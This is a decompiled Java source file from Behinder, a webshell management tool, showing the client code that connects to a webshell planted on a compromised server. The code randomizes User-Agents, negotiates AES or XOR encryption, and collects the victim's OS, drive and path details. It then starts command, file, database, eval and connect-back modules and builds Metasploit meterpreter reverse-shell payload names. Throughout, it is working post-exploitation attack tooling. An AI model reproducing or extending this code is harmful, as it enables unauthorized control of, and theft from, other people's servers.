//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package net.rebeyond.behinder.ui;

import java.util.Base64;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.utils.Constants;
import net.rebeyond.behinder.utils.Utils;
import org.eclipse.swt.browser.Browser;
import org.eclipse.swt.custom.StyledText;
import org.eclipse.swt.graphics.Image;
import org.eclipse.swt.widgets.*;
import org.json.JSONObject;

import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;
import java.util.Random;
import java.util.UUID;

public class BasicInfoUtils {
    public BasicInfoUtils() {
    }

    public static void main(String[] args) {
    }

    public static void formatPayloadName(String currentType, Text msfTipsTxt, String shellType) {
        String payloadName = "java/meterpreter/reverse_tcp";
        if (currentType.equals("php")) {
            payloadName = "php/meterpreter/reverse_tcp";
        } else if (currentType.equals("aspx")) {
            payloadName = "windows/meterpreter/reverse_tcp";
        }

        String result = msfTipsTxt.getText().replace("%s", payloadName);
        if (shellType.equals("shell")) {
            result = result.replace("meterpreter", "shell");
            result = result.replace("Meterpreter", "Shell");
            if (currentType.equals("php")) {
                result = result.replace("php/shell/reverse_tcp", "php/reverse_php");
            }

            if (currentType.equals("jsp")) {
                result = result.replace("java/shell/reverse_tcp", "java/jsp_shell_reverse_tcp");
            }
        } else {
            result = result.replace("shell", "meterpreter");
            result = result.replace("Shell", "Meterpreter");
            if (currentType.equals("php")) {
                result = result.replace("php/reverse_php", "php/meterpreter/reverse_tcp");
            }

            if (currentType.equals("jsp")) {
                result = result.replace("java/jsp_shell_reverse_tcp", "java/meterpreter/reverse_tcp");
            }
        }

        msfTipsTxt.setText(result);
    }

    public static void getBasicInfo(final JSONObject shellEntity, final Browser baseInfoView, final Tree dirTree, final Text cmdview, final Label connectStatus, Text memoTxt, final Text imagePathTxt, Text msfTipsTxt, final Label statusLabel, final StyledText sourceCodeTxt, final Browser updateInfo, final Combo currentPathCombo, final Text sqlTxt) throws Exception {
        int uaIndex = (new Random()).nextInt(Constants.userAgents.length - 1);
        final String currentUserAgent = Constants.userAgents[uaIndex];
        final MainShell mainShell = (MainShell) dirTree.getShell();
        memoTxt.setText(shellEntity.getString("memo"));
        formatPayloadName(shellEntity.getString("type"), msfTipsTxt, "meterpreter");
        connectStatus.setText("Checking....");
        statusLabel.setText("正在获取基本信息……");
        (new Thread() {
            public void run() {
                try {
                    mainShell.currentShellService = new ShellService(shellEntity, currentUserAgent);

                    try {
                        if (mainShell.currentShellService.currentType.equals("php")) {
                            String content = UUID.randomUUID().toString();
                            JSONObject obj = mainShell.currentShellService.echo(content);
                            if (obj.getString("msg").equals(content)) {
                                mainShell.currentShellService.encryptType = Constants.ENCRYPT_TYPE_AES;
                            }
                        }
                    } catch (Exception var6) {
                        var6.printStackTrace();
                        mainShell.currentShellService.encryptType = Constants.ENCRYPT_TYPE_XOR;
                    }

                    JSONObject basicInfoObj = new JSONObject(mainShell.currentShellService.getBasicInfo());
                    final String basicInfoStr = new String(Base64.getDecoder().decode(basicInfoObj.getString("basicInfo")), StandardCharsets.UTF_8);
                    final String driveList = (new String(Base64.getDecoder().decode(basicInfoObj.getString("driveList")), StandardCharsets.UTF_8)).replace(":\\", ":/");
                    final String currentPath = new String(Base64.getDecoder().decode(basicInfoObj.getString("currentPath")), StandardCharsets.UTF_8);
                    final String osInfo = (new String(Base64.getDecoder().decode(basicInfoObj.getString("osInfo")), StandardCharsets.UTF_8)).toLowerCase();
                    mainShell.basicInfoMap.put("basicInfo", basicInfoStr);
                    mainShell.basicInfoMap.put("driveList", driveList);
                    mainShell.basicInfoMap.put("currentPath", currentPath);
                    mainShell.basicInfoMap.put("osInfo", osInfo.replace("winnt", "windows"));
                    Display.getDefault().syncExec(new Runnable() {
                        public void run() {
                            if (!statusLabel.isDisposed()) {
                                baseInfoView.setText(basicInfoStr);
                                statusLabel.setText("基本信息获取完成，你可以使用CTRL+F进行搜索");
                                dirTree.removeAll();
                                String[] var4;
                                int var3 = (var4 = driveList.split(";")).length;

                                for (int var2 = 0; var2 < var3; ++var2) {
                                    String drive = var4[var2];
                                    TreeItem driveItem = new TreeItem(dirTree, 0);
                                    driveItem.setText(drive);
                                    driveItem.setData("type", "root");

                                    try {
                                        driveItem.setImage(new Image(dirTree.getDisplay(), new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/drive.png"))));
                                    } catch (Exception var7) {
                                        var7.printStackTrace();
                                    }
                                }

                                connectStatus.setForeground(Display.getDefault().getSystemColor(9));
                                if (Main.currentProxy != null) {
                                    connectStatus.setText("已连接(代理)");
                                } else {
                                    connectStatus.setText("已连接");
                                }

                                cmdview.setText(currentPath + " >");
                                currentPathCombo.add(currentPath);
                                currentPathCombo.setText(currentPath);
                                if (osInfo.indexOf("windows") < 0 && osInfo.indexOf("winnt") < 0) {
                                    imagePathTxt.setText("/bin/sh");
                                } else {
                                    imagePathTxt.setText("cmd.exe");
                                }

                            }
                        }
                    });
                    mainShell.DBManagerUtils = new DBManagerUtils(mainShell.currentShellService, statusLabel, sqlTxt);
                    mainShell.FileManagerUtils = new FileManagerUtils(mainShell.currentShellService, statusLabel, currentPathCombo, mainShell.basicInfoMap.get("osInfo"));
                    mainShell.CmdUtils = new CmdUtils(mainShell.currentShellService, statusLabel, shellEntity);
                    mainShell.EvalUtils = new EvalUtils(mainShell.currentShellService, statusLabel, sourceCodeTxt);
                    mainShell.ConnectBackUtils = new ConnectBackUtils(mainShell.currentShellService, statusLabel);
                    Main.shellManager.updateOsInfo(shellEntity.getInt("id"), osInfo);
                    (new Thread() {
                        public void run() {
                            try {
                                mainShell.currentShellService.keepAlive();
                            } catch (Exception var2) {
                                var2.printStackTrace();
                            }

                        }
                    }).start();
                    (new Thread() {
                        public void run() {
                            try {
                                final String updateInfoRes = Utils.sendGetRequest("http://www.rebeyond.net/Behinder/update.html?ver=" + Constants.VERSION, "");
                                Display.getDefault().syncExec(new Runnable() {
                                    public void run() {
                                        if (!statusLabel.isDisposed()) {
                                            updateInfo.setText(updateInfoRes);
                                        }
                                    }
                                });
                            } catch (Exception var2) {
                                var2.printStackTrace();
                            }

                        }
                    }).start();
                } catch (final Exception var7) {
                    if (var7.getMessage() != null && !statusLabel.isDisposed()) {
                        Display.getDefault().syncExec(new Runnable() {
                            public void run() {
                                if (!statusLabel.isDisposed()) {
                                    connectStatus.setForeground(Display.getDefault().getSystemColor(3));
                                    connectStatus.setText("Failed!");
                                    baseInfoView.setText(var7.getMessage());
                                    statusLabel.setText("基本信息获取失败:" + var7.getMessage());
                                }
                            }
                        });
                    }

                    var7.printStackTrace();
                }

            }
        }).start();
    }
}
